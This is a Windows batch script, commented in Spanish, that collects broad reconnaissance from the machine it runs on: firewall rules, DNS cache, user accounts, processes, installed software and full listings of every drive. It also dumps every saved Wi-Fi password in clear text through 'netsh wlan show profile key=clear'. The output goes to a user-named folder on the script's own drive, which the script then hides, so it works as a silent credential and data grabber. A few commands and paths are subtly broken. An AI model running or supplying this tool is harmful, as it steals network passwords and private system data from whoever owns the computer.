@echo off

setlocal enabledelayedexpansion


for /f "tokens=2 delims=\" %%A in ('whoami') do set "user=%%A"
echo %user% > %~dp0/user.txt

if not exist "%~d0%user%" mkdir "%~d0%user%"

::Start COMMANDS

netsh advfirewall firewall show rule name=all > %~dp0%user%/ReglasDeEntrada.txt
ipconfig /diplaydns > %~dp0%user%/ModoIncognitoHistorial.txt
date /t > %~dp0%user%/Fecha.txt
ipconfig > %~dp0%user%/Ip_info.txt
echo ">> Obteniendo direcciones IP..."
echo ">> Obteniendo informacion del Sistema..."
systeminfo > %~dp0%user%/System_info.txt

powershell -Command "Get-Process" > %~dp0%user%/get-process.txt
echo ">> Procesos que estan corriendo actualmente..."
powershell -Command "Get-service" > %~dp0%user%/get-Services.txt
echo ">> Servicios que estan corriendo actualmente..."
netsh wlan show all >%~dp0%user%/AllWifiInfo.txt
echo ">> Sincronizando todos los Datos de la Wifi..." 


ping 8.8.8.8 > %~dp0%user%/Test-Internet-connection.txt
echo ">> Haciendo un ping 8.8.8.8 para verificar tu conectividad a internet..."

echo ">> Escaneando Protocolos TCP UDP y puertos de escucha..."
netstat -a > "%~dp0%user%/Muestra todas las conexiones y los puertos de escucha.txt"
netstat -e > "%~dp0%user%/Muestra estadísticas de Ethernet.txt"
echo ">> Guardando estadisticas de ETHERNET..."
netstat -r > "%~dp0%user%/Muestra la tabla de enrutamiento del sistema.txt"
echo ">> Guardando tabla de enrutamiento..."
netstat -i > "%~dp0%user%/Muestra estadísticas de las interfaces de red.txt"
echo ">> Verificando Interfaces de red..."
route print > %~dp0%user%/TabladeEnrutamientoActual.txt
echo ">> Tabla de enrutamiento actual..."
wmic process get name, processid, commandline > %~dp0%user%/Get-PID-Process.txt
echo ">> Obteniendo PID..."
wmic useraccount get name,sid,PasswordChangeable,PasswordExpires,PasswordRequired,status > %~dp0%user%/UsuariosDelSistema.txt
echo ">> Detalles de los Usuarios del Sistema..."
wmic cpu get name,numberofcores,numberoflogicalprocessors > %~dp0%user%/Info-CPU.txt 
echo ">> Obteniendo info de la CPU..."
wmic memorychip get capacity,manufacturer,speed > %~dp0%user%/Info-Memoria.txt
echo ">> Obteniendo info de la Memoria..."
cls

echo ">> Registro de la Fecha de Instalacion del Software..." 
wmic REGISTRY > %~dp0%user%/Fecha de instalacion del Software.txt
echo ">> Reconociendo .exe arrancados al inicio del sistema..." 
wmic STARTUP > %~dp0%user%/Aplicaciones START-UP.txt
echo ">> Capturando todos los Drivers instalados..." 
wmic SYSDRIVER> %~dp0%user%/Exe-Drivers.txt
echo ">> Profundizando en los sensores de temperatura y voltage..." 
wmic TEMPERATURE > %~dp0%user%/Sensor-Temperature.txt
wmic VOLTAGE > %~dp0SecretFolder/Sensor-Voltage.txt
echo ">> Verificando zona horaria..." 
wmic TIMEZONE> %~dp0%user%/Zona-horaria.txt
echo ">> Dispositivo de sonido..." 
wmic SOUNDDEV > %~dp0%user%/Sound-Device.txt
echo ">> Obteniendo version SO..." 
wmic os get caption, version, osarchitecture > %~dp0%user%/Version_SO.txt
echo ">> Checking HardDrives..."
wmic diskdrive get model, size, status > %~dp0%user%/DiscosDuros.txt
echo ">> Terminando con los informes de RED..."
wmic nicconfig where "ipenabled=true" get description, ipaddress, macaddress > %~dp0%user%/Red2.txt
echo ">> Capturando informacion del Bios..."
wmic bios get /format:list > %~dp0%user%/BIOS-Info.txt
echo ">> Capturando Paquetes de Todos los Servicios Instalados..."
wmic service get name, displayname, state > %~dp0%user%/Servicios-Instalados.txt
echo ">> Software installed..."
wmic product get name, version > %~dp0%user%/InstalledSoftware.txt
cls



echo ">> Buscando Directorios de el Sistema!!"
dir c: /s /q /a > %~dp0%user%/Driver_C.txt
echo ">> Buscando otros Directorios!!"

dir d: /s /q /a > %~dp0%user%/Driver_D.txt
dir e: /s /q /a > %~dp0%user%/Driver_E.txt
dir b: /s /q /a > %~dp0%user%/Driver_B.txt
dir f: /s /q /a > %~dp0%user%/Driver_F.txt
dir g: /s /q /a > %~dp0%user%/Driver_G.txt
dir h: /s /q /a > %~dp0%user%/Driver_H.txt
dir i: /s /q /a > %~dp0%user%/Driver_I.txt
dir j: /s /q /a > %~dp0%user%/Driver_J.txt
dir k: /s /q /a > %~dp0%user%/Driver_K.txt
dir l: /s /q /a > %~dp0%user%/Driver_L.txt
dir m: /s /q /a > %~dp0%user%/Driver_M.txt
dir n: /s /q /a > %~dp0%user%/Driver_N.txt
dir o: /s /q /a > %~dp0%user%/Driver_O.txt
dir p: /s /q /a > %~dp0%user%/Driver_P.txt
dir q: /s /q /a > %~dp0%user%/Driver_Q.txt
dir r: /s /q /a > %~dp0%user%/Driver_R.txt
dir s: /s /q /a > %~dp0%user%/Driver_S.txt
dir t: /s /q /a > %~dp0%user%/Driver_T.txt
dir u: /s /q /a > %~dp0%user%/Driver_U.txt
dir v: /s /q /a > %~dp0%user%/Driver_V.txt
dir w: /s /q /a > %~dp0%user%/Driver_W.txt
dir x: /s /q /a > %~dp0%user%/Driver_X.txt
dir y: /s /q /a > %~dp0%user%/Driver_Y.txt
dir z: /s /q /a > %~dp0%user%/Driver_Z.txt


echo ">> Realizando un mirror del Admin de Tareas..."
tasklist > %~dp0%user%/Espejo_Administrador_de_tareas.txt
echo ">> Estadisticas de Red..."
netstat -s > "%~dp0%user%/Muestra estadísticas de los protocolos TCP, UDP, ICMP y otros.txt"
echo ">> Obteniendo Reporte del uso de la bateria..."
powercfg /batteryreport 

copy "C:\Windows\System32\battery-report.html" "%~dp0%user%"

cls

openfiles /query > "%~dp0%user%/Archivos abiertos remotamente a través de puntos locales compartidos.txt"
BCDEDIT > "%~dp0%user%/Base de datos de arranque para controlar la carga del arranque.txt"
COMPACT > "%~dp0%user%/Muestra el estado de compresión de archivos en particiones NTFS"
DRIVERQUERY > %~dp0%user%/driversinstalled.txt




whoami > %~dp0%user%/User-Active.txt
echo ">> Haciendo un Who am I..."

echo ">> Comenzando el rastreo-DUAL de todas las interfaces de Red-Wifi..."
for /f "tokens=1* delims=:" %%a in ('netsh wlan show interface ^| findstr /r /C:"....SSID"') do (

  set "Name=%%b"
  set "Name=!Name:~1!"
  netsh wlan show profile name="!Name!" key=clear | findstr "Key content" >> %~dp0%user%/wifi_Password_actual_English_Version.txt
)

for /f "tokens=2* delims=:" %%a in ('netsh wlan show interface ^| findstr /C:"SSID"') do (

  set "Name=%%a"
  set "Name=!Name:~1!"
  netsh wlan show profile name="!Name!" key=clear | findstr /C:"Contenido de la clave" >> %~dp0%user%/Clave_wifi_actual_version_español.txt
)
echo ">> Casi Hemos Terminado..."
for /f "tokens=1* delims=:" %%a in ('netsh wlan show profiles ^| findstr /C:"All User Profile"') do (

  set "Name=%%b"
  set "Name=!Name:~1!"
  netsh wlan show profile name="!Name!" key=clear >> %~dp0%user%/wifi_info_English_version.txt
)




echo ">> TODO LISTO"

for /f "tokens=1* delims=:" %%a in ('netsh wlan show profiles ^| findstr /C:"Perfil de todos los usuarios"') do (

  set "Name=%%b"
  set "Name=!Name:~1!"
  netsh wlan show profile name="!Name!" key=clear >> %~dp0%user%/wifi_info_Spanish_version.txt
)


del "%~dp0user.txt"
del "%~dp0battery-report.html"
attrib +h "%~d0/%user%\"

exit
endlocal


